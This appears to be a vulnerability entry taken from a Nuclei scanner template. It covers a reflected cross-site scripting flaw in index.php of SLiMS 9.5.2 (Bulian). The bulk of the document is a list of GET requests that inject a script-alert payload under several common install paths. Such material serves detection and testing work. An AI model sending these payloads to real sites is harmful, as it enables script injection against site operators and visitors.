# Vulnerability: Senayan Library Management System v9.5.2 (Bulian) - Cross-Site Scripting
**Classification:** SENAYAN
**Source:** Nuclei Template (`slims-9-xss-index.yaml`)

## Description
SLiMS 9.5.2 (Bulian) vulnerable to Cross-Site Scripting in index.php. When injected, website will execute the payload repeatedly

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
GET {{BaseURL}}/perpustakaan/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
GET {{BaseURL}}/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
GET {{BaseURL}}/perpustakaan/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
GET {{BaseURL}}/e-library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
GET {{BaseURL}}/perpus/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
GET {{BaseURL}}/digilib/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
GET {{BaseURL}}/bulian/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
GET {{BaseURL}}/library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
```

